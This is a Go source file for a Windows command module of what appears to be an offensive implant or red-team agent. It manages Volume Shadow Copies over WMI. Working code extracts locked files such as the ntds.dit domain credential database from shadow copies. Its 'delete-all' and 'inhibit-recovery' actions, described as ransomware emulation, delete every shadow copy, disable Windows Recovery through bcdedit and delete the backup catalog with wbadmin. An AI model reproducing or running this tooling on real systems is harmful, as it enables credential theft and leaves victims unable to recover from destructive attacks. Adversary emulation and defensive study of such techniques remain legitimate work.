//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"runtime"
	"strings"

	ole "github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"

	"fawkes/pkg/structs"
)

type VSSCommand struct{}

func (c *VSSCommand) Name() string {
	return "vss"
}

func (c *VSSCommand) Description() string {
	return "Manage Volume Shadow Copies — list, create, delete, and extract files"
}

func (c *VSSCommand) Execute(task structs.Task) structs.CommandResult {
	var args vssArgs

	if task.Params == "" {
		return errorResult("Error: parameters required.\nActions: list, create, delete, extract")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return vssList()
	case "create":
		return vssCreate(args)
	case "delete":
		return vssDelete(args)
	case "extract":
		return vssExtract(args)
	case "delete-all":
		return vssDeleteAll(args)
	case "inhibit-recovery":
		return vssInhibitRecovery(args)
	case "shutdown":
		return vssShutdownWindows(args)
	case "reboot":
		return vssRebootWindows(args)
	default:
		return errorf("Unknown action: %s\nAvailable: list, create, delete, delete-all, extract, inhibit-recovery, shutdown, reboot", args.Action)
	}
}

// vssWMIConnect connects to root\CIMV2 for VSS operations.
func vssWMIConnect() (*ole.IDispatch, *ole.IDispatch, func(), error) {
	runtime.LockOSThread()

	err := ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
	if err != nil {
		oleErr, ok := err.(*ole.OleError)
		if !ok || (oleErr.Code() != ole.S_OK && oleErr.Code() != 0x00000001) {
			runtime.UnlockOSThread()
			return nil, nil, nil, fmt.Errorf("CoInitializeEx failed: %v", err)
		}
	}

	unknown, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to create SWbemLocator: %v", err)
	}
	locator, err := unknown.QueryInterface(ole.IID_IDispatch)
	unknown.Release()
	if err != nil {
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("failed to query IDispatch: %v", err)
	}

	serviceResult, err := oleutil.CallMethod(locator, "ConnectServer", "", `root\CIMV2`)
	if err != nil {
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
		return nil, nil, nil, fmt.Errorf("ConnectServer failed: %v", err)
	}
	services := serviceResult.ToIDispatch()

	cleanup := func() {
		services.Release()
		locator.Release()
		ole.CoUninitialize()
		runtime.UnlockOSThread()
	}

	return locator, services, cleanup, nil
}

// vssList enumerates all shadow copies.
func vssList() structs.CommandResult {
	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject, VolumeName, InstallDate, OriginatingMachine, ServiceMachine FROM Win32_ShadowCopy")
	if err != nil {
		return errorf("Error querying shadow copies: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var sb strings.Builder
	sb.WriteString("Volume Shadow Copies:\n\n")

	count := 0
	err = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		// Note: do NOT Release item — ForEach manages the VARIANT lifecycle

		idResult, _ := oleutil.GetProperty(item, "ID")
		devResult, _ := oleutil.GetProperty(item, "DeviceObject")
		volResult, _ := oleutil.GetProperty(item, "VolumeName")
		dateResult, _ := oleutil.GetProperty(item, "InstallDate")
		origResult, _ := oleutil.GetProperty(item, "OriginatingMachine")

		id := ""
		if idResult != nil {
			id = idResult.ToString()
			idResult.Clear()
		}
		dev := ""
		if devResult != nil {
			dev = devResult.ToString()
			devResult.Clear()
		}
		vol := ""
		if volResult != nil {
			vol = volResult.ToString()
			volResult.Clear()
		}
		date := ""
		if dateResult != nil {
			date = dateResult.ToString()
			dateResult.Clear()
		}
		orig := ""
		if origResult != nil {
			orig = origResult.ToString()
			origResult.Clear()
		}

		if count > 0 {
			sb.WriteString("\n")
		}
		count++
		sb.WriteString(fmt.Sprintf("  [%d] ID: %s\n", count, id))
		sb.WriteString(fmt.Sprintf("      Device: %s\n", dev))
		sb.WriteString(fmt.Sprintf("      Volume: %s\n", vol))
		sb.WriteString(fmt.Sprintf("      Created: %s\n", date))
		sb.WriteString(fmt.Sprintf("      Machine: %s\n", orig))
		return nil
	})

	if err != nil {
		return errorf("Error enumerating shadow copies: %v\n%s", err, sb.String())
	}

	if count == 0 {
		sb.WriteString("  (none found)\n")
	}
	sb.WriteString(fmt.Sprintf("\nTotal: %d shadow copies\n", count))

	return successResult(sb.String())
}

// vssCreate creates a new shadow copy.
func vssCreate(args vssArgs) structs.CommandResult {
	volume := args.Volume
	if volume == "" {
		volume = "C:\\"
	}
	if !strings.HasSuffix(volume, "\\") {
		volume += "\\"
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	// Get the Win32_ShadowCopy class
	classResult, err := oleutil.CallMethod(services, "Get", "Win32_ShadowCopy")
	if err != nil {
		return errorf("Error getting Win32_ShadowCopy class: %v", err)
	}
	defer classResult.Clear()
	classDisp := classResult.ToIDispatch()

	// Call Win32_ShadowCopy.Create(Volume, Context)
	// Context = "ClientAccessible" for standard VSS snapshot
	createResult, err := oleutil.CallMethod(classDisp, "Create", volume, "ClientAccessible")
	if err != nil {
		return errorf("Error creating shadow copy: %v\nRequires administrator privileges.", err)
	}
	defer createResult.Clear()

	retVal := createResult.Value()

	// Query all shadow copies to find the newest one (the one we just created).
	// VolumeName in WMI is a volume GUID path, not the drive letter, so we
	// query all copies and take the last (newest) one.
	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT ID, DeviceObject FROM Win32_ShadowCopy")
	if err == nil {
		defer resultSet.Clear()
		resultDisp := resultSet.ToIDispatch()
		var lastID, lastDev string
		_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
			item := v.ToIDispatch()
			idR, _ := oleutil.GetProperty(item, "ID")
			devR, _ := oleutil.GetProperty(item, "DeviceObject")
			if idR != nil {
				lastID = idR.ToString()
				idR.Clear()
			}
			if devR != nil {
				lastDev = devR.ToString()
				devR.Clear()
			}
			return nil
		})
		if lastDev != "" {
			return successf("Shadow copy created:\n  Volume: %s\n  ID: %s\n  Device: %s\n  Return Value: %v\n\nExtract files with:\n  vss -action extract -id \"%s\" -source \"\\Windows\\NTDS\\ntds.dit\" -dest \"C:\\temp\\ntds.dit\"", volume, lastID, lastDev, retVal, lastDev)
		}
	}

	return successf("Shadow copy created:\n  Volume: %s\n  Return Value: %v (0 = Success)", volume, retVal)
}

// vssDelete deletes a shadow copy by ID.
func vssDelete(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy ID from list output)")
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	// Query for the specific shadow copy
	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		fmt.Sprintf("SELECT * FROM Win32_ShadowCopy WHERE ID = '%s'", args.ID))
	if err != nil {
		return errorf("Error querying shadow copy: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	deleted := false
	var deleteErr error

	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		_, err := oleutil.CallMethod(item, "Delete_")
		if err != nil {
			deleteErr = err
			return fmt.Errorf("deleting shadow copy: %w", err)
		}
		deleted = true
		return nil
	})

	if deleteErr != nil {
		return errorf("Error deleting shadow copy: %v\nRequires administrator privileges.", deleteErr)
	}

	if !deleted {
		return errorf("Shadow copy not found: %s", args.ID)
	}

	return successf("Shadow copy deleted: %s", args.ID)
}

// vssExtract copies a file from a shadow copy to a destination.
func vssExtract(args vssArgs) structs.CommandResult {
	if args.ID == "" {
		return errorResult("Error: id is required (shadow copy device path, e.g., \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1)")
	}
	if args.Source == "" {
		return errorResult("Error: source is required (path within shadow copy, e.g., \\Windows\\NTDS\\ntds.dit)")
	}
	if args.Dest == "" {
		return errorResult("Error: dest is required (local destination path)")
	}

	// Build the full shadow copy path
	// Device path is like \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
	sourcePath := args.ID
	if !strings.HasSuffix(sourcePath, "\\") {
		sourcePath += "\\"
	}
	// Source path should be relative (e.g., Windows\NTDS\ntds.dit)
	source := strings.TrimPrefix(args.Source, "\\")
	sourcePath += source

	// Open source file from shadow copy
	srcFile, err := os.Open(sourcePath)
	if err != nil {
		return errorf("Error opening shadow copy file: %v\nPath: %s", err, sourcePath)
	}
	defer srcFile.Close()

	// Create destination file
	dstFile, err := os.Create(args.Dest)
	if err != nil {
		return errorf("Error creating destination file: %v", err)
	}
	defer dstFile.Close()

	// Copy the file
	bytesCopied, err := io.Copy(dstFile, srcFile)
	if err != nil {
		return errorf("Error copying file: %v (copied %d bytes before failure)", err, bytesCopied)
	}

	return successf("Extracted from shadow copy:\n  Source: %s\n  Dest: %s\n  Size: %d bytes", sourcePath, args.Dest, bytesCopied)
}

// vssDeleteAll deletes ALL shadow copies on the system.
// MITRE ATT&CK: T1490 (Inhibit System Recovery)
// This emulates ransomware behavior — requires explicit confirmation.
func vssDeleteAll(args vssArgs) structs.CommandResult {
	if !args.Confirm {
		return errorResult("SAFETY: delete-all requires -confirm true. This will delete ALL shadow copies on the system (T1490 - Inhibit System Recovery). This is a destructive, irreversible action used in ransomware emulation.")
	}

	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		return errorf("Error connecting to WMI: %v", err)
	}
	defer cleanup()

	resultSet, err := oleutil.CallMethod(services, "ExecQuery",
		"SELECT * FROM Win32_ShadowCopy")
	if err != nil {
		return errorf("Error querying shadow copies: %v", err)
	}
	defer resultSet.Clear()

	resultDisp := resultSet.ToIDispatch()
	var deleted, failed int
	var sb strings.Builder
	sb.WriteString("Shadow Copy Deletion (T1490):\n\n")

	_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
		item := v.ToIDispatch()
		idResult, _ := oleutil.GetProperty(item, "ID")
		id := ""
		if idResult != nil {
			id = idResult.ToString()
			idResult.Clear()
		}

		_, err := oleutil.CallMethod(item, "Delete_")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  FAILED: %s — %v\n", id, err))
			failed++
		} else {
			sb.WriteString(fmt.Sprintf("  DELETED: %s\n", id))
			deleted++
		}
		return nil
	})

	sb.WriteString(fmt.Sprintf("\nResult: %d deleted, %d failed", deleted, failed))
	if deleted == 0 && failed == 0 {
		sb.WriteString(" (no shadow copies found)")
	}

	return successResult(sb.String())
}

// vssInhibitRecovery performs comprehensive system recovery inhibition.
// MITRE ATT&CK: T1490 (Inhibit System Recovery)
// Actions: delete all shadow copies, disable Windows Recovery, delete backup catalog.
// Requires explicit confirmation due to destructive nature.
func vssInhibitRecovery(args vssArgs) structs.CommandResult {
	if !args.Confirm {
		return errorResult("SAFETY: inhibit-recovery requires -confirm true. This will:\n  1. Delete ALL shadow copies\n  2. Disable Windows Recovery Environment\n  3. Delete backup catalog\n  4. Disable System Restore\nThis is a destructive, irreversible action used in ransomware emulation (T1490).")
	}

	var sb strings.Builder
	sb.WriteString("Recovery Inhibition (T1490 — Inhibit System Recovery):\n\n")

	// Step 1: Delete all shadow copies via WMI
	sb.WriteString("[1] Shadow Copy Deletion:\n")
	_, services, cleanup, err := vssWMIConnect()
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		resultSet, err := oleutil.CallMethod(services, "ExecQuery",
			"SELECT * FROM Win32_ShadowCopy")
		if err != nil {
			sb.WriteString(fmt.Sprintf("  ERROR querying: %v\n", err))
		} else {
			resultDisp := resultSet.ToIDispatch()
			var deleted int
			_ = oleutil.ForEach(resultDisp, func(v *ole.VARIANT) error {
				item := v.ToIDispatch()
				_, delErr := oleutil.CallMethod(item, "Delete_")
				if delErr == nil {
					deleted++
				}
				return nil
			})
			resultSet.Clear()
			sb.WriteString(fmt.Sprintf("  Deleted %d shadow copies\n", deleted))
		}
		cleanup()
	}

	// Step 2: Disable Windows Recovery Environment (bcdedit)
	sb.WriteString("\n[2] Windows Recovery Environment:\n")
	outBytes, err := execCmdTimeout("bcdedit", "/set", "{default}", "recoveryenabled", "No")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	// Step 3: Disable boot status policy (ignore boot failures)
	sb.WriteString("\n[3] Boot Status Policy:\n")
	outBytes, err = execCmdTimeout("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	// Step 4: Delete backup catalog
	sb.WriteString("\n[4] Backup Catalog:\n")
	outBytes, err = execCmdTimeout("wbadmin", "delete", "catalog", "-quiet")
	if err != nil {
		sb.WriteString(fmt.Sprintf("  ERROR: %v (wbadmin may not be available)\n", err))
	} else {
		sb.WriteString(fmt.Sprintf("  %s\n", strings.TrimSpace(string(outBytes))))
	}

	sb.WriteString("\nRecovery inhibition complete. System recovery options have been disabled.")

	return successResult(sb.String())
}
